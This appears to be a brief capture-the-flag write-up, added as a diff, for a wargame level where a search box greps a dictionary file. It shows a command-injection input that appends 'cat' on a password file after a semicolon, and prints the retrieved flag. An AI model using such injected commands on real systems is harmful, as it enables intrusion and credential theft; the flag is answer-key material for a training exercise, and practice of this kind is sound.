@@ -1,0 +1,12 @@
+We have an input search box. Find words that containing this entered string.
+
+enter science -> outputs: conscience; consciences; ...
+it greps the input from a list of words from the dictionary.txt
+
+we know that the flags are stored in /etc/natas_webpass/ from level7.
+
+Try to cat it out by using ;
+
+science; cat /etc/natas_webpass/natas10
+
+flag retrieved: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
